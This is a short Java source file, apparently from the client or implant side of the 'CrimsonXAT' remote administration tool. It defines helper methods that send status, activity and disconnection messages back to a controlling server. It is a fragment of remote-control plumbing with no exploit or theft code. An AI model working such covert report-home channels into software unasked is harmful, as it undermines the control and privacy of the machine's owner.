/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.containers.SystemMessage;

public enum Commands {
	;

	public static void sendSM(SystemMessage sm) {

		Stage2.getSettings().messages.add(sm);

		if (Communications.connected()) {
			Communications.sendHome(new Message(Utilities.randId(), BMN.INCOMING_systemMessage, sm));
		}

	}

	public static void updateActivityStatus(String status) {
		Message m = new Message(Utilities.randId(), BMN.INCOMING_activityStatus, status);
		Communications.sendHome(m);
	}

	public static void disconnect() {
		Communications.sendHome(new Message(Utilities.randId(), BMN.DISCONNECTION));
	}

	public static void updateProcessStatus(String s) {
		Communications.sendHome(new Message(Utilities.randId(), BMN.INCOMING_processStatus, s));
	}

}
